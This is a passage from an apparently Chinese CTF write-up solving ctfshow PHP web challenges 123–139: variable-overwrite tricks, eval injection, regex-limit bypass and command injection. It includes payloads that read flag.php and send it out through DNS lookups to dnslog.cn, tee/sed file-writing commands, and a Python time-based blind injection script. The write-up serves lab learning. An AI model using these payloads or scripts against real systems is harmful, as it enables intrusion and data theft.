class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本地试了一下发现%0c36可以绕过is_numeric</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$num!==&#x27;36&#x27;  这个是个强等于，因为%0c36不是字符串，所以也可以绕过</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">trim($num)!==&#x27;36&#x27;  因为trim()不会把%0c给去掉，那么也可以进行绕过</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter($num)==&#x27;36&#x27;   这个函数里面也没有把%0c过滤的东西，也可以成功返回36</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有疑问的是这个$num==&#x27;36&#x27;  和  $num!==&#x27;36&#x27;  这就涉及到了一个强等于和弱类型比较的问题了，==表示的是值相等就行，===表示的是值和类型都必须相等。</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220222611713.png" alt="image-20221220222611713"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220222727063.png" alt="image-20221220222727063"></p><h2 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220222813626.png" alt="image-20221220222813626"></p><p>这里有个命名的规则就是吗，php中变量名只能由数字字母和下划线组成，如果变量名不是这样的话，就会被强制转化，但php只会转换一次，那么就可以利用这一特点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果变量名中有 空格 + [  则会被转化成  _</span><br></pre></td></tr></table></figure><p><strong>implode</strong>    —-&gt;就是将数组以字符串的形式进行输出</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221215115138.png" alt="image-20221221215115138"></p><p><strong>get_defined_vars</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221215244737.png" alt="image-20221221215244737"></p><p>这道题可以使用这两个东西来解。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221215529027.png" alt="image-20221221215529027"></p><p>试了一下，发现<code>echo</code>可以用  那么可以尝试直接<code>echo $flag</code>.</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221215640332.png" alt="image-20221221215640332"></p><p>拿到flag，或者也可以上面的两种函数的结合方法。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221215751225.png" alt="image-20221221215751225"></p><p>也可以直接拿到flag.</p><h2 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221215903203.png" alt="image-20221221215903203"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这次要使用POST的方法提交数据，extract($_POST)会将POST的数据中的键名和键值转换为相应的变量名和变量值</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract($_GET)  和post一样</span><br></pre></td></tr></table></figure><p>那么传fl0g就可以直接用<strong>post</strong>传了</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221222623391.png" alt="image-20221221222623391"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_export()还是可以替代var_dump来用</span><br></pre></td></tr></table></figure><p><strong>解法二</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221222913484.png" alt="image-20221221222913484"></p><p>show_source();   一样的效果</p><h2 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221223023719.png" alt="image-20221221223023719"></p><p>这题开始判断长度了</p><p><strong>parse_str</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222164714051.png" alt="image-20221222164714051"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222164510131.png" alt="image-20221222164510131"></p><p>那么我们就可以知道parse_str是干什么的了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">就是将一串字符串来解析成数组的形式并存储在设定的数组里，而+会起到分割作用，如果不分割的话，可能会像上图一样变成只有一个下标为0的一个数组，如果有加号分割的话，就会变成有下标分别为0和1的数组，那么现在就已经把这个函数的运用全部讲完了。</span><br></pre></td></tr></table></figure><p><strong>回到题目</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。</span><br><span class="line">不同的参数保存不同的信息，比如，</span><br><span class="line">$_SERVER[&#x27;argv&#x27;] //传递给该脚本的参数。</span><br><span class="line">$_SERVER[&#x27;argc&#x27;] //传递给程序的命令行参数的个数。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=$_SERVER[&#x27;argv&#x27;];   是个空数组</span><br></pre></td></tr></table></figure><p>那么我们就可以利用parse_str往数组里面传值。</p><p><strong>解法一</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET:?a=1+fl0g=flag_give_me</span><br><span class="line">POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])</span><br><span class="line">//这下数组a里面就会有key值分别为0和1的值  下标为0对应着a=1，下标为1对应这fl0g=flag_give_me 那么就可以解决问题了。(这是没有parse_str的时候，parse_str的话，key就分别变为a和fl0g)</span><br></pre></td></tr></table></figure><p><strong>解法二</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">url/?$fl0g=flag_give_me;</span><br><span class="line">CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=eval($a[0])</span><br><span class="line"></span><br><span class="line">$c=&quot;eval($a[0])&quot;</span><br><span class="line">$a[0]=&quot;$fl0g=flag_give_me;&quot;</span><br><span class="line">$c=&quot;eval($fl0g=flag_give_me;)&quot;</span><br><span class="line">eval($c;)</span><br><span class="line">eval(eval($fl0g=flag_give_me;);)</span><br><span class="line">// 把eval换成assert也行   assert(xxx)  如果xxx是字符串的话，会把它当作php代码来执行  和上面的一样</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert和eval与parse_str不同的是，eval要加上$符号</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222171040081.png" alt="image-20221222171040081"></p><p>往数组a传值的话，都会先传到下标0下面</p><p><strong>非预期解</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get: ?0=var_export($GLOBALS);</span><br><span class="line">post: CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=eval($_REQUEST[0])</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222171455203.png" alt="image-20221222171455203"></p><p>这样写也行，与parse_str不同的是有无$.</p><h2 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222171621023.png" alt="image-20221222171621023"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222172706658.png" alt="image-20221222172706658"></p><p><a href="https://www.cnblogs.com/luomir/p/5129875.html">https://www.cnblogs.com/luomir/p/5129875.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过这个图片和这个博客，知道了$url = $_SERVER[&#x27;QUERY_STRING&#x27;];的作用</span><br></pre></td></tr></table></figure><p>那么就可以进行判断了，那么就是得$url会等于问号后面的内容，那么我们就可以让$url=ctf<em>show=ilove36d，然后就可以得到flag，但是</em>被过滤了，我们就可以通过非法命名来获得__,</p><p>那么[ + .被过滤了，我们就可以使用空格来代替，那么就可以成功输出flag.</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222173109121.png" alt="image-20221222173109121"></p><h2 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222173902226.png" alt="image-20221222173902226"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">小知识点： _()是一个函数</span><br><span class="line"></span><br><span class="line">_()==gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll</span><br><span class="line"></span><br><span class="line">get_defined_vars()函数</span><br><span class="line"></span><br><span class="line">get_defined_vars — 返回由所有已定义变量所组成的数组 这样可以获得 $flag</span><br></pre></td></tr></table></figure><p>本地测试过了，<code>call_user_func</code>（）里面有不是函数的东西，也可以var_dump()输出。那么就只需要管最里面的一层<code>`call_user_func</code>（)`了</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222185459392.png" alt="image-20221222185459392"></p><h2 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222190711929.png" alt=""></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222190719988.png" alt="image-20221222190719988"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">默认目录/var/www/html  就是先返回上一层目录（html)，然后访问一个不存在的目录，然后接着访问上层目录(www)，然后就访问www目录下的html,然后在访问html目录下的flag.php就可以拿到flag了。</span><br></pre></td></tr></table></figure><h2 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222191026405.png" alt="image-20221222191026405"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222192132660.png" alt="image-20221222192132660"></p><p>直接输入就拿到flag了。</p><p><a href="https://bbs.csdn.net/topics/320227966">https://bbs.csdn.net/topics/320227966</a>    关于正则的这篇文章全部概括了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.   是匹配任意字符</span><br><span class="line">+   是匹配出现的次数</span><br><span class="line">?   是任意字符</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第一个if的意思是ctfshow的前面如果有字符的话，就会被匹配到</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第二个if的意思是因为stripos返回的是这个字符串第一次出现的位置，返回的是int型，而FALSE是bool型，这里又是强等于，肯定不相等。</span><br></pre></td></tr></table></figure><h2 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222193417083.png" alt="image-20221222193417083"></p><p>这里有个小漏洞，就是正则匹配的话，字符长度超过100w的话就不会在继续匹配了。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222193744465.png" alt="image-20221222193744465"></p><p>进行100w次打印，然后加上36Dctfshow</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222193825464.png" alt="image-20221222193825464"></p><h2 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222194056040.png" alt="image-20221222194056040"></p><p>是一个小网站</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222194137043.png" alt="image-20221222194137043"></p><p>访问robots.txt得到可以访问/admin的信息</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222194619883.png" alt="image-20221222194619883"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里就是考察优先级关系，依次从高到低  非与或 ！&amp; |</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后第二个就是先进行与判断为false,然后false与$username进行或运算的到true，然后在令code等于admin，就可以拿到flag了。</span><br></pre></td></tr></table></figure><h2 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222195142976.png" alt="image-20221222195142976"></p><p>这道题学习的点还是很多的。</p><p><strong>解法一</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222224838401.png" alt="image-20221222224838401"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过传入?F=&#x27;$F &#x27;;touch 1,传入之后访问1，没有返回，所以当前目录不可写</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222224847076.png" alt="image-20221222224847076"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?F=`$F`;+ping `cat flag.php | grep ctfshow | tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;`.wxtcke.dnslog.cn -c 1   </span><br><span class="line">//.wxtcke.dnslog.cn   是自己去danslog上获取的二级域名</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">``这个函数的作用是执行php代码，``是shell_exec()函数的缩写，然后就去命令执行。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里的意思是会截取`$F`;+这六个字符，但是$F的值并没有变，那么就会截取到eval(`$F`;+)里面，变成eval(``$F`;+ping `cat flag.php | grep ctfshow | tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;`.wxtcke.dnslog.cn -c 1`;+)   由于前面的`$F`;+，无法识别，就会绕过，去执行后面可以执行的代码。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl不带有任何参数时，curl 就是发出 GET 请求。</span><br><span class="line">grep指令用于查找内容包含指定的范本样式的文件</span><br><span class="line">这里可以使用dns外带把flag带出来</span><br><span class="line">由于flag.php中内容太多了 需要进行格式化 使用linux的 tr -cd</span><br><span class="line">因为flag是数字加字母的字符串，所以可以用tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;</span><br><span class="line">uuid 格式8-4-4-4-12   就是每隔n个字符之间都会有一个-</span><br></pre></td></tr></table></figure><p><a href="http://www.ruanyifeng.com/blog/2019/09/curl-reference.html">http://www.ruanyifeng.com/blog/2019/09/curl-reference.html</a>  curl命令讲解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-c, --complement：反选设定字符。也就是符合 SET1 的部份不做处理，不符合的剩余部份才进行转换(payload&quot;&quot;里的东西就是符合的，所以不进行转换或者清除)</span><br><span class="line">-d, --delete：删除指令字符</span><br><span class="line">-s, --squeeze-repeats：缩减连续重复的字符成指定的单个字符</span><br><span class="line">-t, --truncate-set1：削减 SET1 指定范围，使之与 SET2 设定长度相等</span><br><span class="line">--help：显示程序用法信息</span><br></pre></td></tr></table></figure><p><strong>解法二</strong></p><p><a href="https://blog.csdn.net/qq_46091464/article/details/109095382">https://blog.csdn.net/qq_46091464/article/details/109095382</a>  这是出题人自己写的wp，可以去看看，因为我的bp不是专业版，用不了那个功能，所以就演示不了了。</p><p>总结一下  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无回显我们可以用反弹shell 或者curl外带 或者盲注 这里的话反弹没有成功，但是可以外带。</span><br></pre></td></tr></table></figure><h2 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222231203109.png" alt="image-20221222231203109"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222233123188.png" alt="image-20221222233123188"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222233130740.png" alt="image-20221222233130740"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);</span><br><span class="line">extract($_POST);</span><br><span class="line">这两行代码的讲解，上面的题有过解释，这里就不多说了</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload为什么可以这样写呢，首先就是$_SERVER[&#x27;QUERY_STRING&#x27;]会以url/?=xxx  问号后的那内容用&quot;xx&quot;，存储下来，然后又被parse_str()这个函数分割成数组的形式存储下来，就是key=key1,value=36d</span><br><span class="line">key=key2  value=36d</span><br><span class="line">extract($_POST);  这个是变量覆盖，其他的函数必须以post的形式进行输入，那么由于$_SERVER[&#x27;QUERY_STRING&#x27;]只能在get上输入，所以就得在get上这样写了  _POST[key1]=36d&amp;_POST[key2]=36d  以这种形式替代post输入</span><br></pre></td></tr></table></figure><h2 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222234906905.png" alt="image-20221222234906905"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?F=`$F`; ping `nl flag.php|awk &#x27;NR==15&#x27;|tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;`.j4ko5o.dnslog.cn -c 1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里awk &#x27;NR==15&#x27;表示的是读取第几行，这是从前面的flag出现的位置判断出来的。然后其他指令的意思web133有讲</span><br></pre></td></tr></table></figure><p>然后就去通过danslog查看拼接flag就好了。</p><h2 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222235502578.png" alt="image-20221222235502578"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223151706052.png" alt="image-20221223151706052"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tee  a指令会从标准输入设备读取数据，将其内容输出到标准输出设备，同时保存成文件a。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">先：</span><br><span class="line">?c=ls | tee a</span><br><span class="line">然后访问url/a,电脑会自动下载一个名为a的文件，然后查看文件，发现里面只有index.php</span><br><span class="line"></span><br><span class="line">?c=ls / | tee b</span><br><span class="line">发现里面有f149_15_h3r3</span><br><span class="line"></span><br><span class="line">?c=cat /f149_15_h3r3 | tee c</span><br></pre></td></tr></table></figure><p>然后就可以拿到flag了。</p><p><strong>解法二</strong></p><p>这个比较骚，就是把题目都给改了。</p><p><a href="https://blog.csdn.net/weixin_39731083/article/details/82495950">https://blog.csdn.net/weixin_39731083/article/details/82495950</a>  xargs sed命令介绍</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第一步：ls | xargs sed -i &quot;s/die/echo/&quot;   --&gt;-i是进入文本编辑模式 s是表示替换 这里是把die替换成echo</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第二步： ls | xargs sed -i &quot;s/exec/system/&quot;  /后面加个g的话是全局替换，不加是只替换匹配到的第一个</span><br></pre></td></tr></table></figure><h2 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223154219888.png" alt="image-20221223154219888"></p><p>这道题考察了就是如何不new一个参数也能访问类里边的函数。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow=ctfshow::getFlag  ---&gt;就是  类名::函数名  这是函数得是static的情况下</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不是static的情况  ctfshow=call_user_func_array(array(new ctfshow(),&#x27;getFlag&#x27;))  ctfshow()---&gt;是类名   getFlag是函数名。</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223160407968.png" alt="image-20221223160407968"></p><h2 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223160443873.png" alt="image-20221223160443873"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223161022503.png" alt="image-20221223161022503"></p><p>利用这一函数的特性，也是不用：：的一种写法</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow[]=ctfshow&amp;ctfshow[]=getFlag</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223161241007.png" alt="image-20221223161241007"></p><h2 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223161625931.png" alt="image-20221223161625931"></p><p>和web136一样，但是这题的tee和xargs sed用不了了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">所以得用命令执行的bash盲注</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221223175030609.png" alt="image-20221223175030609"></p><p>拿到根目录下的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f149_15_h3r3</span><br></pre></td></tr></table></figure><p><strong>第一步拿根目录下的flag名字</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2021-10-04 08:43:04</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-10-04 12:03:52</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"><span class="comment"># /f149_15_h3r3</span></span><br><span class="line"><span class="comment"># ctfshow&#123;7bae6719-8739-4628-b57b-acf7a5fc4351&#125;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://35e55b2c-6023-4fc4-8835-40abd33dae52.challenge.ctf.show/?c=&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;if [ `cat /f149_15_h3r3  | cut -c &#123;&#125;` == \&quot;&#123;&#125;\&quot; ];then sleep 3;fi&quot;</span></span><br><span class="line">payload = <span class="string">&quot;if [ `ls / -1 | cut -c &#123;&#125; | awk \&#x27;NR==&#123;&#125;\&#x27;` == \&#x27;&#123;&#125;\&#x27; ];then sleep 4;fi&quot;</span>   <span class="comment">#cut是截断的意思，第一个括号是代表截断第几个字符 awk &#x27;NR==&#123;&#125;&#x27; 是查看第几行  最后一个&#123;&#125;代表着遇到哪个字符就截断</span></span><br><span class="line"><span class="comment"># payload的含义是，如果遇到该截断的字符，就会延时3秒，并进行截断。</span></span><br><span class="line">result = <span class="string">&quot;+++++++++++++++++&quot;</span></span><br><span class="line">row=<span class="number">6</span></span><br><span class="line">length=<span class="number">20</span></span><br><span class="line"></span><br><span class="line">strings  = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz_-0123456789&quot;</span></span><br><span class="line"><span class="comment">#strings  = &quot;ctfshow&#125;abdefgijklmnpqruvwxyz_-0123456789&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,row):</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,length):</span><br><span class="line"><span class="comment">#print(&quot;+++++++++++++++第&quot;+str(c)+&quot;个字符&quot;)</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">target = url+payload.<span class="built_in">format</span>(c,i,s)    <span class="comment">#format()里面填的东西是上面payload&#123;&#125;中的东西</span></span><br><span class="line"><span class="built_in">print</span>(target)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">requests.get(target,timeout=<span class="number">3</span>)  <span class="comment">#如果请求在3秒之内完成就结束，如果超过3秒就会代表执行了sleep 4，就会执行下面的except:</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">result +=s</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">result += <span class="string">&quot; &quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>第二步，读取flag</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 